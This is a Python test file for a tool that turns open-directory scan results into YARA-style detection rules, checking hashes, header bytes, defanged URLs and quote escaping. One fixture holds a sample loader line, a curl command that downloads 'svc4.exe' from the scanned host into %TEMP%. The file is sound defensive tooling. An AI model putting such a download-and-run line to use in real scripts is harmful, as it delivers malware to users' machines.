"""Rules built from what a scan actually read, and honest about that."""

from __future__ import annotations

from dirsift.models import Entry, ScanResult
from dirsift.rules import build_rules

TARGET = "http://203.0.113.24/files/"


def result_with(*entries: Entry) -> ScanResult:
    return ScanResult(root_url=TARGET, entries=list(entries))


def loader() -> Entry:
    return Entry(
        url=TARGET + "install.bat",
        name="install.bat",
        depth=1,
        kind="script",
        fetched_bytes=120,
        sha256="a" * 64,
        md5="b" * 32,
        head_hex="4065",
        text_preview='curl -s -o "%TEMP%" http://203.0.113.24/bin/svc4.exe',
    )


def payload() -> Entry:
    return Entry(
        url=TARGET + "bin/svc4.exe",
        name="svc4.exe",
        depth=2,
        kind="pe",
        fetched_bytes=4096,
        truncated=True,
        head_hex="4d5a90000300000004000000",
        cluster="svc{n}.exe",
    )


def test_a_rule_carries_the_author_the_run_and_the_target():
    rules = build_rules(result_with(loader()), [loader()], run_name="20260916-011500-demo")
    assert 'author = "cyb3rp03t"' in rules
    assert "20260916-011500-demo" in rules
    assert "hxxp://203[.]0[.]113[.]24/files/" in rules  # defanged, like everywhere else


def test_a_file_read_whole_gets_an_exact_hash_rule():
    rules = build_rules(result_with(loader()), [loader()], run_name="run")
    assert 'import "hash"' in rules
    assert "a" * 64 in rules
    assert "hash.sha256(0, filesize)" in rules


def test_a_file_cut_at_the_ceiling_contributes_its_head_bytes():
    rules = build_rules(result_with(payload()), [payload()], run_name="run")
    assert "{ 4d 5a 90 00 03 00 00 00 04 00 00 00 }" in rules
    assert "hash.sha256" not in rules  # nothing was read whole, so no exact rule
    assert "partial" in rules.lower()


def test_text_contributes_strings_from_the_file():
    rules = build_rules(result_with(loader()), [loader()], run_name="run")
    assert "svc4.exe" in rules
    assert "ascii" in rules


def test_quotes_in_the_evidence_do_not_break_the_rule():
    entry = loader()
    rules = build_rules(result_with(entry), [entry], run_name="run")
    quoted = [line for line in rules.split("\n") if "%TEMP%" in line]
    assert quoted, "the line with a quote was dropped"
    assert chr(92) + '"' in quoted[0]


def test_two_files_land_in_one_rule():
    both = [loader(), payload()]
    rules = build_rules(result_with(*both), both, run_name="run")
    assert "install.bat" in rules
    assert "svc4.exe" in rules
    assert rules.count("rule ") == 2  # one exact, one by content
